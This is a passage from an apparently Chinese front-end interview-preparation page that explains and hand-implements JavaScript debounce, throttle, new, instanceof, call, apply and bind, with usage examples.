</code></pre></div><h2 id="_12-手写题"><a href="#_12-手写题" class="header-anchor">#</a> 12 手写题</h2> <h3 id="防抖"><a href="#防抖" class="header-anchor">#</a> 防抖</h3> <blockquote><p>防抖函数原理：<strong>把触发非常频繁的事件合并成一次去执行</strong> 在指定时间内只执行一次回调函数，如果在指定的时间内又触发了该事件，则回调函数的执行时间会基于此刻重新开始计算</p></blockquote> <p><img alt="" data-src="https://s.poetries.work/uploads/2022/07/e47703fd75859ad8.png" loading="lazy" class="lazy"> <img alt="" data-src="https://s.poetries.work/uploads/2023/01/b6ce0bd8b072ae9c.png" loading="lazy" class="lazy"></p> <p>防抖动和节流本质是不一样的。<strong>防抖动是将多次执行变为<code>最后一次执行</code>，节流是将多次执行变成<code>每隔一段时间执行</code></strong></p> <blockquote><p>eg. 像百度搜索，就应该用防抖，当我连续不断输入时，不会发送请求；当我一段时间内不输入了，才会发送一次请求；如果小于这段时间继续输入的话，时间会重新计算，也不会发送请求。</p></blockquote> <p><strong>手写简化版:</strong></p> <div class="language-js extra-class"><pre class="language-js"><code><span class="token comment">// func是用户传入需要防抖的函数</span>
<span class="token comment">// wait是等待时间</span>
<span class="token keyword">const</span> <span class="token function-variable function">debounce</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token parameter">func<span class="token punctuation">,</span> wait <span class="token operator">=</span> <span class="token number">50</span></span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
  <span class="token comment">// 缓存一个定时器id</span>
  <span class="token keyword">let</span> timer <span class="token operator">=</span> <span class="token number">0</span>
  <span class="token comment">// 这里返回的函数是每次用户实际调用的防抖函数</span>
  <span class="token comment">// 如果已经设定过定时器了就清空上一次的定时器</span>
  <span class="token comment">// 开始一个新的定时器，延迟执行用户传入的方法</span>
  <span class="token keyword">return</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter"><span class="token operator">...</span>args</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>timer<span class="token punctuation">)</span> <span class="token function">clearTimeout</span><span class="token punctuation">(</span>timer<span class="token punctuation">)</span>
    timer <span class="token operator">=</span> <span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
      <span class="token function">func</span><span class="token punctuation">.</span><span class="token function">apply</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">,</span> args<span class="token punctuation">)</span>
    <span class="token punctuation">}</span><span class="token punctuation">,</span> wait<span class="token punctuation">)</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre></div><p><strong>适用场景：</strong></p> <ul><li>文本输入的验证，连续输入文字后发送 AJAX 请求进行验证，验证一次就好</li> <li>按钮提交场景：防止多次提交按钮，只执行最后提交的一次</li> <li>服务端验证场景：表单验证需要服务端配合，只执行一段连续的输入事件的最后一次，还有搜索联想词功能类似</li></ul> <h3 id="节流"><a href="#节流" class="header-anchor">#</a> 节流</h3> <blockquote><p>节流函数原理:指频繁触发事件时，只会在指定的时间段内执行事件回调，即触发事件间隔大于等于指定的时间才会执行回调函数。总结起来就是：<strong>事件，按照一段时间的间隔来进行触发</strong>。</p></blockquote> <p><img alt="" data-src="https://s.poetries.work/uploads/2022/07/0abcf5e689d2716b.png" loading="lazy" class="lazy"> <img alt="" data-src="https://s.poetries.work/uploads/2023/01/07fded84cc81ece4.png" loading="lazy" class="lazy"></p> <blockquote><p>像dom的拖拽，如果用消抖的话，就会出现卡顿的感觉，因为只在停止的时候执行了一次，这个时候就应该用节流，在一定时间内多次执行，会流畅很多</p></blockquote> <p><strong>手写简版</strong></p> <p>使用时间戳的节流函数会在第一次触发事件时立即执行，以后每过 <code>wait</code> 秒之后才执行一次，并且最后一次触发事件不会被执行</p> <p><strong>时间戳方式：</strong></p> <div class="language-js extra-class"><pre class="language-js"><code><span class="token comment">// func是用户传入需要防抖的函数</span>
<span class="token comment">// wait是等待时间</span>
<span class="token keyword">const</span> <span class="token function-variable function">throttle</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token parameter">func<span class="token punctuation">,</span> wait <span class="token operator">=</span> <span class="token number">50</span></span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
  <span class="token comment">// 上一次执行该函数的时间</span>
  <span class="token keyword">let</span> lastTime <span class="token operator">=</span> <span class="token number">0</span>
  <span class="token keyword">return</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter"><span class="token operator">...</span>args</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token comment">// 当前时间</span>
    <span class="token keyword">let</span> now <span class="token operator">=</span> <span class="token operator">+</span><span class="token keyword">new</span> <span class="token class-name">Date</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token comment">// 将当前时间和上一次执行函数时间对比</span>
    <span class="token comment">// 如果差值大于设置的等待时间就执行函数</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>now <span class="token operator">-</span> lastTime <span class="token operator">&gt;</span> wait<span class="token punctuation">)</span> <span class="token punctuation">{</span>
      lastTime <span class="token operator">=</span> now
      <span class="token function">func</span><span class="token punctuation">.</span><span class="token function">apply</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">,</span> args<span class="token punctuation">)</span>
    <span class="token punctuation">}</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token function">setInterval</span><span class="token punctuation">(</span>
  <span class="token function">throttle</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
  <span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token number">500</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
  <span class="token number">1</span>
<span class="token punctuation">)</span>
</code></pre></div><p><strong>定时器方式：</strong></p> <blockquote><p>使用定时器的节流函数在第一次触发时不会执行，而是在 delay 秒之后才执行，当最后一次停止触发后，还会再执行一次函数</p></blockquote> <div class="language-js extra-class"><pre class="language-js"><code><span class="token keyword">function</span> <span class="token function">throttle</span><span class="token punctuation">(</span><span class="token parameter">func<span class="token punctuation">,</span> delay</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
  <span class="token keyword">var</span> timer <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token keyword">var</span> context <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">;</span>
    <span class="token keyword">var</span> args <span class="token operator">=</span> arguments<span class="token punctuation">;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span>timer<span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token comment">// 当前有任务了，直接返回</span>
    timer <span class="token operator">=</span> <span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
      <span class="token function">func</span><span class="token punctuation">.</span><span class="token function">apply</span><span class="token punctuation">(</span>context<span class="token punctuation">,</span> args<span class="token punctuation">)</span><span class="token punctuation">;</span>
      timer <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span><span class="token punctuation">,</span>delay<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre></div><p><strong>适用场景：</strong></p> <ul><li>拖拽场景：固定时间内只执行一次，防止超高频次触发位置变动。<code>DOM</code> 元素的拖拽功能实现（<code>mousemove</code>）</li> <li>缩放场景：监控浏览器<code>resize</code></li> <li>滚动场景：监听滚动<code>scroll</code>事件判断是否到页面底部自动加载更多</li> <li>动画场景：避免短时间内多次触发动画引起性能问题</li></ul> <p><strong>总结</strong></p> <ul><li><strong>函数防抖</strong>：<code>限制执行次数，多次密集的触发只执行一次</code> <ul><li>将几次操作合并为一次操作进行。原理是维护一个计时器，规定在<code>delay</code>时间后触发函数，但是在<code>delay</code>时间内再次触发的话，就会取消之前的计时器而重新设置。这样一来，只有最后一次操作能被触发。</li></ul></li> <li><strong>函数节流</strong>：<code>限制执行的频率，按照一定的时间间隔有节奏的执行</code> <ul><li>使得一定时间内只触发一次函数。原理是通过判断是否到达一定时间来触发函数。</li></ul></li></ul> <h3 id="new的过程"><a href="#new的过程" class="header-anchor">#</a> New的过程</h3> <p><strong>new操作符做了这些事：</strong></p> <ul><li>创建一个全新的对象<code>obj</code>，继承构造函数的原型：这个对象的<code>__proto__</code>要指向构造函数的原型<code>prototype</code></li> <li>执行构造函数，使用 <code>call/apply</code> 改变 <code>this</code> 的指向（将<code>obj</code>作为<code>this</code>）</li> <li>返回值为<code>object</code>类型则作为<code>new</code>方法的返回值返回，否则返回上述全新对象<code>obj</code></li></ul> <div class="language-js extra-class"><pre class="language-js"><code><span class="token keyword">function</span> <span class="token function">myNew</span><span class="token punctuation">(</span><span class="token parameter">constructor<span class="token punctuation">,</span> <span class="token operator">...</span>args</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token comment">// 1. 基于原型链 创建一个新对象，继承构造函数constructor的原型对象（Person.prototype）上的属性</span>
  <span class="token keyword">let</span> newObj <span class="token operator">=</span> Object<span class="token punctuation">.</span><span class="token function">create</span><span class="token punctuation">(</span>constructor<span class="token punctuation">.</span>prototype<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token comment">// 添加属性到新对象上 并获取obj函数的结果</span>
  <span class="token comment">// 调用构造函数，将this调换为新对象，通过强行赋值的方式为新对象添加属性</span>
  <span class="token comment">// 2. 将newObj作为this，执行 constructor ，传入参数</span>
  <span class="token keyword">let</span> res <span class="token operator">=</span> <span class="token function">constructor</span><span class="token punctuation">.</span><span class="token function">apply</span><span class="token punctuation">(</span>newObj<span class="token punctuation">,</span> args<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 改变this指向新创建的对象</span>

  <span class="token comment">// 3. 如果函数的执行结果有返回值并且是一个对象, 返回执行的结果, 否则, 返回新创建的对象地址</span>
  <span class="token keyword">return</span> <span class="token keyword">typeof</span> res <span class="token operator">===</span> <span class="token string">'object'</span> <span class="token operator">?</span> res<span class="token operator">:</span> newObj<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre></div><div class="language-js extra-class"><pre class="language-js"><code><span class="token comment">// 用法</span>
<span class="token keyword">function</span> <span class="token function">Person</span><span class="token punctuation">(</span><span class="token parameter">name<span class="token punctuation">,</span> age</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">this</span><span class="token punctuation">.</span>name <span class="token operator">=</span> name<span class="token punctuation">;</span>
  <span class="token keyword">this</span><span class="token punctuation">.</span>age <span class="token operator">=</span> age<span class="token punctuation">;</span>

 <span class="token comment">// 如果构造函数内部，return 一个引用类型的对象，则整个构造函数失效，而是返回这个引用类型的对象，而不是返回this</span>
  <span class="token comment">// 在实例中就没法获取Person原型上的getName方法</span>
<span class="token punctuation">}</span>
<span class="token class-name">Person</span><span class="token punctuation">.</span>prototype<span class="token punctuation">.</span><span class="token function-variable function">say</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>age<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span>
<span class="token keyword">let</span> p1 <span class="token operator">=</span> <span class="token function">myNew</span><span class="token punctuation">(</span>Person<span class="token punctuation">,</span> <span class="token string">&quot;poety&quot;</span><span class="token punctuation">,</span> <span class="token number">18</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>p1<span class="token punctuation">.</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>p1<span class="token punctuation">)</span><span class="token punctuation">;</span>
p1<span class="token punctuation">.</span><span class="token function">say</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre></div><h3 id="instanceof原理"><a href="#instanceof原理" class="header-anchor">#</a> instanceOf原理</h3> <p><strong>思路：</strong></p> <ul><li>步骤1：先取得当前类的原型，当前实例对象的原型链</li> <li>​步骤2：一直循环（执行原型链的查找机制）
<ul><li>取得当前实例对象原型链的原型链（<code>proto = proto.__proto__</code>，沿着原型链一直向上查找）</li> <li>如果 当前实例的原型链<code>__proto__</code>上找到了当前类的原型<code>prototype</code>，则返回 <code>true</code></li> <li>如果 一直找到<code>Object.prototype.__proto__ == null</code>，<code>Object</code>的基类(<code>null</code>)上面都没找到，则返回 <code>false</code></li></ul></li></ul> <p><img alt="" data-src="https://s.poetries.work/uploads/2023/02/5c6bd3977e62de20.png" loading="lazy" class="lazy"></p> <div class="language-js extra-class"><pre class="language-js"><code><span class="token comment">// 实例.__ptoto__ === 构造函数.prototype</span>
<span class="token keyword">function</span> <span class="token function">_instanceof</span><span class="token punctuation">(</span><span class="token parameter">instance<span class="token punctuation">,</span> classOrFunc</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token comment">// 由于instance要检测的是某对象，需要有一个前置判断条件</span>
    <span class="token comment">//基本数据类型直接返回false</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">typeof</span> instance <span class="token operator">!==</span> <span class="token string">'object'</span> <span class="token operator">||</span> instance <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>

    <span class="token keyword">let</span> proto <span class="token operator">=</span> Object<span class="token punctuation">.</span><span class="token function">getPrototypeOf</span><span class="token punctuation">(</span>instance<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 等价于 instance.__ptoto__</span>
    <span class="token keyword">while</span><span class="token punctuation">(</span>proto<span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token comment">// 当proto == null时，说明已经找到了Object的基类null 退出循环</span>
        <span class="token comment">// 实例的原型等于当前构造函数的原型</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span>proto <span class="token operator">==</span> classOrFunc<span class="token punctuation">.</span>prototype<span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
        <span class="token comment">// 沿着原型链__ptoto__一层一层向上查</span>
        proto <span class="token operator">=</span> Object<span class="token punctuation">.</span><span class="token function">getPrototypeof</span><span class="token punctuation">(</span>proto<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 等价于 proto.__ptoto__</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">return</span> <span class="token boolean">false</span>
<span class="token punctuation">}</span>

console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'test'</span><span class="token punctuation">,</span> <span class="token function">_instanceof</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">,</span> Array<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment">// false</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'test'</span><span class="token punctuation">,</span> <span class="token function">_instanceof</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> Array<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment">// true</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'test'</span><span class="token punctuation">,</span> <span class="token function">_instanceof</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">,</span> Array<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment">// false</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'test'</span><span class="token punctuation">,</span> <span class="token function">_instanceof</span><span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">,</span> Object<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment">// true</span>
</code></pre></div><h3 id="实现call方法"><a href="#实现call方法" class="header-anchor">#</a> 实现call方法</h3> <p><strong>call做了什么:</strong></p> <ul><li>将函数设为对象的属性</li> <li>执行和删除这个函数</li> <li>指定<code>this</code>到函数并传入给定参数执行函数</li> <li>如果不传入参数，默认指向 <code>window</code></li></ul> <p><strong>分析：如何在函数执行时绑定this</strong></p> <ul><li>如<code>var obj = {x:100,fn() { this.x }}</code></li> <li>执行<code>obj.fn()</code> ,此时<code>fn</code>内部的<code>this</code>就指向了<code>obj</code></li> <li>可借此来实现函数绑定<code>this</code></li></ul> <blockquote><p>原生<code>call</code>、<code>apply</code>传入的<code>this</code>如果是值类型，会被<code>new Object</code>（如<code>fn.call('abc')</code>）</p></blockquote> <div class="language-js extra-class"><pre class="language-js"><code><span class="token comment">//实现call方法</span>

<span class="token comment">// 相当于在obj上调用fn方法，this指向obj </span>
<span class="token comment">// var obj = {fn: function(){console.log(this)}}</span>
<span class="token comment">// obj.fn() fn内部的this指向obj</span>
<span class="token comment">// call就是模拟了这个过程</span>
<span class="token comment">// context 相当于obj</span>

<span class="token class-name">Function</span><span class="token punctuation">.</span>prototype<span class="token punctuation">.</span><span class="token function-variable function">myCall</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">context <span class="token operator">=</span> window<span class="token punctuation">,</span> <span class="token operator">...</span>args</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">typeof</span> context <span class="token operator">!==</span> <span class="token string">'object'</span><span class="token punctuation">)</span> context <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">(</span>context<span class="token punctuation">)</span> <span class="token comment">// 值类型，变为对象</span>

  <span class="token comment">// args 传递过来的参数</span>
  <span class="token comment">// this 表示调用call的函数fn</span>
  <span class="token comment">// context 是call传入的this</span>

  <span class="token comment">// 在context上加一个唯一值，不会出现属性名称的覆盖</span>
  <span class="token keyword">let</span> fnKey <span class="token operator">=</span> <span class="token function">Symbol</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
  <span class="token comment">// 相等于 obj[fnKey] = fn </span>
  context<span class="token punctuation">[</span>fnKey<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">;</span> <span class="token comment">// this 就是当前的函数</span>
  
  <span class="token comment">// 绑定了this</span>
  <span class="token keyword">let</span> result <span class="token operator">=</span> context<span class="token punctuation">[</span>fnKey<span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token operator">...</span>args<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 相当于 obj.fn()执行 fn内部this指向context(obj)</span>

  <span class="token comment">// 清理掉 fn ，防止污染（即清掉obj上的fnKey属性）</span>
  <span class="token keyword">delete</span> context<span class="token punctuation">[</span>fnKey<span class="token punctuation">]</span><span class="token punctuation">;</span>

  <span class="token comment">// 返回结果 </span>
  <span class="token keyword">return</span> result<span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span>
</code></pre></div><div class="language-js extra-class"><pre class="language-js"><code><span class="token comment">//用法：f.call(this,arg1)</span>

<span class="token keyword">function</span> <span class="token function">f</span><span class="token punctuation">(</span><span class="token parameter">a<span class="token punctuation">,</span>b</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
 console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>a<span class="token operator">+</span>b<span class="token punctuation">)</span>
 console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>name<span class="token punctuation">)</span>
<span class="token punctuation">}</span>
<span class="token keyword">let</span> obj<span class="token operator">=</span><span class="token punctuation">{</span>
 <span class="token literal-property property">name</span><span class="token operator">:</span><span class="token number">1</span>
<span class="token punctuation">}</span>
f<span class="token punctuation">.</span><span class="token function">myCall</span><span class="token punctuation">(</span>obj<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span> <span class="token comment">// 不传obj，this指向window</span>
</code></pre></div><h3 id="实现apply方法"><a href="#实现apply方法" class="header-anchor">#</a> 实现apply方法</h3> <blockquote><p>思路: 利用<code>this</code>的上下文特性。<code>apply</code>其实就是改一下参数的问题</p></blockquote> <div class="language-js extra-class"><pre class="language-js"><code><span class="token class-name">Function</span><span class="token punctuation">.</span>prototype<span class="token punctuation">.</span><span class="token function-variable function">myApply</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">context <span class="token operator">=</span> window<span class="token punctuation">,</span> args</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token comment">// 这里传参和call传参不一样</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">typeof</span> context <span class="token operator">!==</span> <span class="token string">'object'</span><span class="token punctuation">)</span> context <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">(</span>context<span class="token punctuation">)</span> <span class="token comment">// 值类型，变为对象</span>

  <span class="token comment">// args 传递过来的参数</span>
  <span class="token comment">// this 表示调用call的函数</span>
  <span class="token comment">// context 是apply传入的this</span>

  <span class="token comment">// 在context上加一个唯一值，不会出现属性名称的覆盖</span>
  <span class="token keyword">let</span> fnKey <span class="token operator">=</span> <span class="token function">Symbol</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
  context<span class="token punctuation">[</span>fnKey<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">;</span> <span class="token comment">// this 就是当前的函数</span>
  
  <span class="token comment">// 绑定了this</span>
  <span class="token keyword">let</span> result <span class="token operator">=</span> context<span class="token punctuation">[</span>fnKey<span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token operator">...</span>args<span class="token punctuation">)</span><span class="token punctuation">;</span> 

  <span class="token comment">// 清理掉 fn ，防止污染</span>
  <span class="token keyword">delete</span> context<span class="token punctuation">[</span>fnKey<span class="token punctuation">]</span><span class="token punctuation">;</span> 

  <span class="token comment">// 返回结果</span>
  <span class="token keyword">return</span> result<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre></div><div class="language-js extra-class"><pre class="language-js"><code><span class="token comment">// 使用</span>
<span class="token keyword">function</span> <span class="token function">f</span><span class="token punctuation">(</span><span class="token parameter">a<span class="token punctuation">,</span>b</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
 console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span>b<span class="token punctuation">)</span>
 console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>name<span class="token punctuation">)</span>
<span class="token punctuation">}</span>
<span class="token keyword">let</span> obj<span class="token operator">=</span><span class="token punctuation">{</span>
 <span class="token literal-property property">name</span><span class="token operator">:</span><span class="token string">'张三'</span>
<span class="token punctuation">}</span>
f<span class="token punctuation">.</span><span class="token function">myApply</span><span class="token punctuation">(</span>obj<span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
</code></pre></div><h3 id="实现bind方法"><a href="#实现bind方法" class="header-anchor">#</a> 实现bind方法</h3> <blockquote><p><code>bind</code> 的实现对比其他两个函数略微地复杂了一点，涉及到参数合并(类似函数柯里化)，因为 <code>bind</code> 需要返回一个函数，需要判断一些边界问题，以下是 <code>bind</code> 的实现</p></blockquote> <ul><li><code>bind</code> 返回了一个函数，对于函数来说有两种方式调用，一种是直接调用，一种是通过 <code>new</code> 的方式，我们先来说直接调用的方式</li> <li>对于直接调用来说，这里选择了 <code>apply</code> 的方式实现，但是对于参数需要注意以下情况：因为 <code>bind</code> 可以实现类似这样的代码 <code>f.bind(obj, 1)(2)</code>，所以我们需要将两边的参数拼接起来</li> <li>最后来说通过 <code>new</code> 的方式，对于 <code>new</code> 的情况来说，不会被任何方式改变 <code>this</code>，所以对于这种情况我们需要忽略传入的 <code>this</code></li> <li>箭头函数的底层是<code>bind</code>，无法改变<code>this</code>，只能改变参数</li></ul> <p><strong>简洁版本</strong></p> <ul><li>对于普通函数，绑定<code>this</code>指向</li> <li>对于构造函数，要保证原函数的原型对象上的属性不能丢失</li></ul> <div class="language-js extra-class"><pre class="language-js"><code><span class="token class-name">Function</span><span class="token punctuation">.</span>prototype<span class="token punctuation">.</span><span class="token function-variable function">myBind</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">context <span class="token operator">=</span> window<span class="token punctuation">,</span> <span class="token operator">...</span>args</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token comment">// context 是 bind 传入的 this</span>
  <span class="token comment">// args 是 bind 传入的各个参数</span>
  <span class="token comment">// this表示调用bind的函数</span>
  <span class="token keyword">let</span> self <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">;</span> <span class="token comment">// fn.bind(obj) self就是fn</span>

  <span class="token comment">//返回了一个函数，...innerArgs为实际调用时传入的参数</span>
  <span class="token keyword">let</span> <span class="token function-variable function">fBound</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter"><span class="token operator">...</span>innerArgs</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> 
      <span class="token comment">//this instanceof fBound为true表示构造函数的情况。如new func.bind(obj)</span>
      <span class="token comment">// 当作为构造函数时，this 指向实例，此时 this instanceof fBound 结果为 true，可以让实例获得来自绑定函数的值</span>
      <span class="token comment">// 当作为普通函数时，this 默认指向 window，此时结果为 false，将绑定函数的 this 指向 context</span>
      <span class="token keyword">return</span> <span class="token function">self</span><span class="token punctuation">.</span><span class="token function">apply</span><span class="token punctuation">(</span> <span class="token comment">// 函数执行</span>
        <span class="token keyword">this</span> <span class="token keyword">instanceof</span> <span class="token class-name">fBound</span> <span class="token operator">?</span> <span class="token keyword">this</span> <span class="token operator">:</span> context<span class="token punctuation">,</span> 
        args<span class="token punctuation">.</span><span class="token function">concat</span><span class="token punctuation">(</span>innerArgs<span class="token punctuation">)</span> <span class="token comment">// 拼接参数</span>
      <span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>

  <span class="token comment">// 如果绑定的是构造函数，那么需要继承构造函数原型属性和方法：保证原函数的原型对象上的属性不丢失</span>
  <span class="token comment">// 实现继承的方式: 使用Object.create</span>
  fBound<span class="token punctuation">.</span>prototype <span class="token operator">=</span> Object<span class="token punctuation">.</span><span class="token function">create</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>prototype<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> fBound<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre></div><div class="language-js extra-class"><pre class="language-js"><code><span class="token comment">// 测试用例</span>

<span class="token keyword">function</span> <span class="token function">Person</span><span class="token punctuation">(</span><span class="token parameter">name<span class="token punctuation">,</span> age</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'Person name：'</span><span class="token punctuation">,</span> name<span class="token punctuation">)</span><span class="token punctuation">;</span>
  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'Person age：'</span><span class="token punctuation">,</span> age<span class="token punctuation">)</span><span class="token punctuation">;</span>
  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'Person this：'</span><span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 构造函数this指向实例对象</span>
<span class="token punctuation">}</span>

<span class="token comment">// 构造函数原型的方法</span>
<span class="token class-name">Person</span><span class="token punctuation">.</span>prototype<span class="token punctuation">.</span><span class="token function-variable function">say</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'person say'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token comment">// 普通函数</span>
<span class="token keyword">function</span> <span class="token function">normalFun</span><span class="token punctuation">(</span><span class="token parameter">name<span class="token punctuation">,</span> age</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'普通函数 name：'</span><span class="token punctuation">,</span> name<span class="token punctuation">)</span><span class="token punctuation">;</span> 
  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'普通函数 age：'</span><span class="token punctuation">,</span> age<span class="token punctuation">)</span><span class="token punctuation">;</span> 
